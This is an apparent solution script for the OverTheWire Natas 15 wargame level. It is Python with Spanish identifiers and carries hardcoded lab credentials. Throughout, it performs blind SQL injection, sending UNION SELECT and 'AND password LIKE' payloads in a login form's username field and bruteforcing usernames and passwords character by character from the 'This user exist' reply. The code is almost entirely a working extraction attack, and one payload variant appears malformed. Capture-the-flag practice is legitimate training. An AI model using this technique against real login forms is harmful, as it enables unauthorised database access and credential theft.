import requests

# Fill in your details here to be posted to the login form.


#Function to stablish connection
def iniciar_sesion(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session


              

def obtener_nombres(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    start_users = ['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']

    print(f"estos son las iniciales de los usuarios")
    full_name = []
    for user_to_find in start_users:
        while True:
            if contador == len(characters)-1:
                full_name.append(user_to_find)
                contador=0
                break
            print(f"intentando con {user_to_find}{characters[contador]}")
            test = user_to_find+ characters[contador]
            payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+test+"%" }
            r= session.post(url,auth=(username, password),data=payload)
            if b"This user exist" in r.content:
                print(f"encontramos con {characters[contador]}")
                user_to_find +=characters[contador]
                contador=0

            contador+=1
    print(f"los usuarios son {full_name}")

#password alice  hrotsfm734
#caminos de pass ['t', 'h', '6', 'T', 'H']

def obtener_password(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    newpassword = 'TRD7iZrd5gATjj9PkPEuaOlfEjH'
    while True:
        if contador == len(characters)-1:
            break
        print(f"intentando con {newpassword}{characters[contador]}")
        test = newpassword+ characters[contador]
        #payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%" }
        payload = {'username': "LIKE"+test+"%" }
        r= session.post(url,auth=(username, password),data=payload)
        #print(r.content)
        if b"This user exist" in r.content:
            print(f"encontramos con {characters[contador]}")
            print(r.content)
            newpassword +=characters[contador]
            contador=0
            continue
        contador+=1
    print(f"la password es {newpassword}")

def obtener_password2(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    newpassword = '' #caminos con t [r y R], caminos con T []
    l=[]
    while True:
        if contador == len(characters)-1:
            break
        print(f"intentando con {newpassword}{characters[contador]}")
        test = newpassword+ characters[contador]
        payload = {'username': "natas16\" AND password LIKE \""+test+"%" }
        r= session.post(url,auth=(username, password),data=payload)
        if b"This user exist" in r.content:
            print(f"encontramos con {characters[contador]}")
            l.append(characters[contador])
        contador+=1
    print(f"la password es {l}")




if __name__ == "__main__" :
    username = "natas15"
    password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
    url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
    session= iniciar_sesion(username,password,url)
    obtener_nombres(username,password,session,url)
    #obtener_password(username,password,session,url)
